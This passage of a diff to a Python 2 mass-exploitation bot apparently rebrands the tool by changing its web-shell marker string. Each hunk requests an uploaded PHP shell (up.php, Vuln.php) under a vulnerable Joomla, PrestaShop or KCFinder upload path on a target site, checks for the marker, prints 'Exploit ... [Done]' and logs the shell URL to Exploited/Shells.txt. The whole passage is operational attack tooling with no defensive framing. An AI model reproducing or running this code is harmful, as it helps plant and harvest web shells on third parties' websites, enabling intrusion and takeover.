 				open('Exploited/Shells.txt', 'a').write(url+'/components/com_agora/img/members/0/Vuln.php'+'\n')
 				sys.exit()
@@ -4967,7 +4930,7 @@ def botv1():
 			zxdawGravklib = requests.get(url+'/components/com_mtree/img/listings/o/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
+			if 'MarGusFRom1337School' in zxdawGravklib.content:
 				print '\033[92m[>] \033[0mExploit Com_Mtree  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/components/com_agora/img/members/0/Vuln.php'+'\n')
 				sys.exit()
@@ -4981,7 +4944,7 @@ def botv1():
 			zxdawGravklib = requests.get(url+'/modules/mod_artuploader/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
+			if 'MarGusFRom1337School' in zxdawGravklib.content:
 				print '\033[92m[>] \033[0mExploit Mod_Artuploader  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/components/com_agora/img/members/0/Vuln.php'+'\n')
 				sys.exit()
@@ -4995,7 +4958,7 @@ def botv1():
 			zxdawGravklib = requests.get(url+'/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
+			if 'MarGusFRom1337School' in zxdawGravklib.content:
 				print '\033[92m[>] \033[0mExploit Com_Simplephotogallery  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/Vuln.php'+'\n')
 				sys.exit()
@@ -5011,7 +4974,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/com_sexycontactform/fileupload/files/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Sexycontactform  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/up.php'+'\n')
 				sys.exit()
@@ -5043,7 +5006,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/images/stories/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit com_rokdownloads  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/images/stories/up.php'+'\n')
 				sys.exit()
@@ -5065,7 +5028,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit NovaSFH  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
 				sys.exit()
@@ -5081,7 +5044,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit com_collector  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
 				sys.exit()
@@ -5097,7 +5060,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/images/osproperty/agent/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit osproperty  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/images/osproperty/agent/up.php'+'\n')
 				sys.exit()
@@ -5113,7 +5076,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/images/ksadvertiser/U0/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit com_ksadvertiser  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/images/ksadvertiser/U0/up.php'+'\n')
 				sys.exit()
@@ -5130,7 +5093,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/tmp/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit com_hwdvideoshare  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/tmp/up.php'+'\n')
 				sys.exit()
@@ -5146,7 +5109,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/images/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit mod_jfancy  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/images/up.php'+'\n')
 				sys.exit()
@@ -5178,7 +5141,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/columnadverts/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Columnadverts    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/columnadverts/slides/up.php'+'\n')
 				sys.exit()
@@ -5195,7 +5158,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/vtemslideshow/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Vtemslideshow    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/vtemslideshow/slides/up.php'+'\n')
 				sys.exit()
@@ -5212,7 +5175,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/realty/include/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Realty    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/realty/include/slides/up.php'+'\n')
 				sys.exit()
@@ -5229,7 +5192,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/realty/evogallery/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit evogallery    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/realty/evogallery/slides/up.php'+'\n')
 				sys.exit()
@@ -5246,7 +5209,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/realty/evogallery2/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Evogallery2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/realty/evogallery2/slides/up.php'+'\n')
 				sys.exit()
@@ -5263,7 +5226,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/filesupload/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Resaleform    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/filesupload/up.php'+'\n')
 				sys.exit()
@@ -5280,7 +5243,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/megaproduct/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Megaproduct    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/megaproduct/up.php'+'\n')
 				sys.exit()
@@ -5297,7 +5260,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/soopamobile/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Soopamobile    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/soopamobile/slides/up.php'+'\n')
 				sys.exit()
@@ -5314,7 +5277,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/soopamobile2/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Soopamobile2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/soopamobile2/slides/up.php'+'\n')
 				sys.exit()
@@ -5331,7 +5294,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/soopamobile2/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Soopamobile3    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/soopamobile2/slides/up.php'+'\n')
 				sys.exit()
@@ -5348,7 +5311,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/soopabanners/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Soopabanners    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/soopabanners/slides/up.php'+'\n')
 				sys.exit()
@@ -5365,7 +5328,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/vtermslideshow/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Vtermslideshow    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/vtermslideshow/slides/up.php'+'\n')
 				sys.exit()
@@ -5382,7 +5345,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/simpleslideshow/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Simpleslideshow    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/simpleslideshow/slides/up.php'+'\n')
 				sys.exit()
@@ -5399,7 +5362,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/productpageadverts/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Product Pageadverts    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/productpageadverts/slides/up.php'+'\n')
 				sys.exit()
@@ -5416,7 +5379,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/homepageadvertise/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Homepageadvertise    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/homepageadvertise/slides/up.php'+'\n')
 				sys.exit()
@@ -5433,7 +5396,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/homepageadvertise2/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Homepageadvertise2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/homepageadvertise2/slides/up.php'+'\n')
 				sys.exit()
@@ -5450,7 +5413,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/columnadverts2/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Columnadverts2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/columnadverts2/slides/up.php'+'\n')
 				sys.exit()
@@ -5467,7 +5430,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/filesupload/uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Filesupload    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/filesupload/uploads/up.php'+'\n')
 				sys.exit()
@@ -5484,7 +5447,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/jro_homepageadvertise/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Jro Homepageadvertise    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/jro_homepageadvertise/slides/up.php'+'\n')
 				sys.exit()
@@ -5501,7 +5464,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/jro_homepageadvertise2/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Jro Homepageadvertise2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/jro_homepageadvertise2/slides/up.php'+'\n')
 				sys.exit()
@@ -5518,7 +5481,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/leosliderlayer/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Leosliderlayer    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/leosliderlayer/slides/up.php'+'\n')
 				sys.exit()
@@ -5535,7 +5498,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/leosliderlayer2/slides/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Leosliderlayer2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/leosliderlayer/slides/up.php'+'\n')
 				sys.exit()
@@ -5552,7 +5515,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/vtemskitter/img/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Vtemskitter    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/vtemskitter/img/up.php'+'\n')
 				sys.exit()
@@ -5569,7 +5532,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/additionalproductstabs/file_uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Additionalproductstabs    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/additionalproductstabs/file_uploads/up.php'+'\n')
 				sys.exit()
@@ -5586,7 +5549,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/addthisplugin/file_uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Addthisplugin    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/addthisplugin/file_uploads/up.php'+'\n')
 				sys.exit()
@@ -5603,7 +5566,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/attributewizardpro/file_uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Attributewizardpro    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/attributewizardpro/file_uploads/up.php'+'\n')
 				sys.exit()
@@ -5620,7 +5583,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/attributewizardpro.OLD/file_uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Attributewizardpro old    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/attributewizardpro.OLD/file_uploads/up.php'+'\n')
 				sys.exit()
@@ -5637,7 +5600,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/1attributewizardpro/file_uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Lttributewizardpro    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/1attributewizardpro/file_uploads/up.php'+'\n')
 				sys.exit()
@@ -5654,7 +5617,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/attributewizardpro_x/file_uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Attributewizardpro_x    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/attributewizardpro_x/file_uploads/up.php'+'\n')
 				sys.exit()
@@ -5671,7 +5634,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/advancedslider/uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit advancedslider    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/advancedslider/uploads/up.php'+'\n')
 				sys.exit()
@@ -5688,7 +5651,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/cartabandonmentpro/uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit cartabandonmentpro    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/cartabandonmentpro/uploads/up.php'+'\n')
 				sys.exit()
@@ -5705,7 +5668,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/cartabandonmentproOld/uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit cartabandonmentpro old    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/cartabandonmentproOld/uploads/up.php'+'\n')
 				sys.exit()
@@ -5722,7 +5685,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/videostab/uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit videostab   \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/videostab/uploads/up.php'+'\n')
 				sys.exit()
@@ -5739,7 +5702,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/fieldvmegamenu/uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Fieldvmegamenu   \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/fieldvmegamenu/uploads/up.php'+'\n')
 				sys.exit()
@@ -5756,7 +5719,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/orderfiles/files/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Orderfiles   \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/orderfiles/files/up.php'+'\n')
 				sys.exit()
@@ -5773,7 +5736,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/pk_flexmenu/uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit pk_flexmenu   \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/pk_flexmenu/uploads/up.php'+'\n')
 				sys.exit()
@@ -5790,7 +5753,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/pk_flexmenu_old/uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit pk_flexmenu Old   \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/pk_flexmenu_old/uploads/up.php'+'\n')
 				sys.exit()
@@ -5807,7 +5770,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/pk_vertflexmenu/uploads/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit pk_vertflexmenu  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/pk_vertflexmenu/uploads/up.php'+'\n')
 				sys.exit()
@@ -5824,7 +5787,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/nvn_export_orders/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit nvn_export_orders  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/nvn_export_orders/up.php'+'\n')
 				sys.exit()
@@ -5841,7 +5804,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/tdpsthemeoptionpanel/upload/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit tdpsthemeoptionpanel  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/tdpsthemeoptionpanel/upload/up.php'+'\n')
 				sys.exit()
@@ -5858,7 +5821,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/psmodthemeoptionpanel/upload/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Psmodthemeoptionpanel  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/psmodthemeoptionpanel/upload/up.php'+'\n')
 				sys.exit()
@@ -5875,7 +5838,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/masseditproduct/uploads/file/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit masseditproduct  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/masseditproduct/uploads/file/up.php'+'\n')
 				sys.exit()
@@ -5892,7 +5855,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/upload/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit blocktestimonial  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/upload/up.php'+'\n')
 				sys.exit()
@@ -5908,7 +5871,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/mod_simplefileuploadv1.3/elements/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit mod_simplefileupload  \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/mod_simplefileuploadv1.3/elements/up.php'+'\n')
 				sys.exit()
@@ -5933,7 +5896,7 @@ def botv1():
 			
 			lib = requests.get(url+"/assets/ckeditor/kcfinder/upload/files/up.php.jd")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Kcfinder1  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/assets/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
 				sys.exit()
@@ -5954,7 +5917,7 @@ def botv1():
 			
 			lib = requests.get(url+"/assets/admin/ckeditor/kcfinder/upload/files/up.php.jd")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Kcfinder2  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/assets/admin/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
 				sys.exit()
@@ -5975,7 +5938,7 @@ def botv1():
 			
 			lib = requests.get(url+"/assets/plugins/ckeditor/kcfinder/upload/files/up.php.jd")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Kcfinder3 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/assets/plugins/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
 				sys.exit()
@@ -5995,7 +5958,7 @@ def botv1():
 			
 			lib = requests.get(url+"/admin/ckeditor/kcfinder/upload/files/up.php.jd")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Kcfinder4 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
